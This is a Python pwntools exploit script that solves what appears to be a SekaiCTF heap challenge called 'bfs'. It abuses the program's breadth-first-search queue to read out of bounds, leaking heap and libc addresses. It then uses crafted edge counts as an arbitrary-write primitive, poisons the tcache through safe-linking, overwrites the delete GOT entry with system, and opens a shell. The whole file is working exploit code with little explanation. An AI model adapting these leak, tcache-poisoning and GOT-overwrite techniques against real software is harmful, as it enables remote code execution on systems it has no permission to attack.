from pwn import *
e = ELF("./bfs")
context.binary = e
libc = ELF("./libc.so.6")
if args.FULLREMOTE:
    p = remote("challs.ctf.sekai.team", 4004)
else:
    p = e.process() if args.LOCAL else remote("localhost", 1337)
p.sendline("5000")
def sendtestcase(numnodes, start, to, edges=[]):
    if type(edges[0]) == int:
        edges = [edges]
    p.sendline(f"{numnodes} {len(edges)}")
    for edge in edges:
        p.sendline(f"{edge[0]} {edge[1]}")
    p.sendline(f"{start} {to}")

def recvdata(interactive=False):
    if interactive:
        p.interactive()
        quit()
    p.recvuntil(": ")
    data = p.recvline()[:-1].decode().split(" ")
    return [int(x) for x in data]

def edit_data(data, turninto, idx):
    if type(data) == int:
        data = p64(data)
    if type(turninto) == int:
        turninto = p64(turninto)
    # Build edges that do arbitrary write at a given offset.
    # Requires knowledge of what the original data was.

    # NOTE: There will be side effects becausee edges go both ways. I wonder if this matters.
    data = bytearray(data)
    turninto = bytearray(turninto)
    edges = []
    for i, num in enumerate(data):
        diff = (turninto[i] - num) % 256
        cur = idx + i 
        edge = list(divmod(cur, 256)) # 256*from + dest, we dont just use 0 and the offset we want because then 256*dest + from will be invalid
        edges += [edge for _ in range(diff)] # Add 1 that many times
    return edges

# HEAP ALLOCATION PRIMITIVE: QUEUE MANIPULATIOn
# When it finds a node, it leaves the queue full, letting us arbitrarily inflate and deflate at will(with clever calculations of course)#
# Actually the queue implementation is linear so we don't even need to use the vuln to populate it o/

def populatequeue():
    edges = [[0, i] for i in range(1, 256)]
    sendtestcase(256, 0, 512, edges)
    edges = [[0, i] for i in range(1, 256)]
    sendtestcase(256, 0, 512, edges)
    p.clean(0.2)

def read(offset, num, interactive=False):
    b = b''
    for i in range(num):
        sendtestcase(2, 0, offset + i, [[0,1]])
        b += bytes([recvdata(interactive)[1]])
    return b

first = 0
def populatenofree(num, partial=None):
    # Make it find it so it doesnt pop off(need to make sure that doesnt mess up future traversals doe)
    global first
    for j in range(num):
        edges = [[first, i] for i in list(range(0, first)) + list(range(first + 1,256))]
        if j == num - 1 and partial is not None:
            edges2 = []
            for edge in edges:
                if edge[1] == partial:
                    break
                else:
                    edges2.append(edge)
            sendtestcase(partial, first, partial - 1, edges2)
        else:
            sendtestcase(256, first, 255, edges)
        first += 1
    p.clean(0.2)

safelink = lambda P, L: (L >> 12) ^ P
cleanup = lambda: p.clean(0.2)
populatequeue()
populatequeue()
# Null safe link ptr, easy to decode
leak = (u64(read(0x11020 + 0x110, 8)) << 12) + 0x350
heapbase = leak - 0x23350
log.info(f"Heap base: {hex(heapbase)}")

populatenofree(18)
# Unfindable, pop everything off the queue, freeing a bunch of chunks and placing a libc pointer strategically on the heap
sendtestcase(2, 0, 512, [[0,1]])
recvdata()
libcleak = u64(read(0x11e20 + 0x10, 8))
log.info(f"Libc leak: {hex(libcleak)}")
libc.address = libcleak - 0x219ce0
log.info(f"Libc base: {hex(libc.address)}")

# Luckily we can calculate every single value on the heap as we know heap + libc and the heap is deterministic
loc = heapbase + 0x23e40

# Tcache poison to delete@got 
edges = edit_data(safelink(heapbase + 0x23c30, loc), safelink(e.got['_ZdlPvm'] - 16, loc), 0x11b10)

sendtestcase(2, 0, 1, edges)
cleanup()

first = 0
populatenofree(2,partial=0xdd)

topush = b"sh\x00"

# Make each of the things that are gonna be popped off point to a char of the string we wanna push
edges = [[first + i, topush[i]] for i in range(0, len(topush))]
print(edges)

sendtestcase(256, topush[0], topush[-1], edges)
first += 3

populatenofree(2, partial=0xfd)

# Now we are at delete@got - 16

rop = ROP(libc)
#full = p64(rop.ret.address) + p64(0xdeadbeefdeadbeef) + p64(libc.symbols['system'])
full = p64(rop.ret.address)
topush = full[:7]
edges = [[first + i, topush[i]] for i in range(0, len(topush))]


sendtestcase(256, topush[0], topush[-1], edges)

first += 7

topush = b"\x00\x08"
edges = [[first + i, topush[i]] for i in range(0, len(topush))]


sendtestcase(256, 0, topush[-1], edges)

first += 2

topush = p64(0x0102030405060708)[2:] + p64(libc.symbols['system'])[:6]
edges = [[first + i, topush[i]] for i in range(0, len(topush))]
print(edges)
print(first, edges)

sendtestcase(256, 27, topush[-1], edges)
print(hex(libc.symbols['system']))
pause()
p.sendline("256 0")
p.sendline("0 69420")
p.interactive()
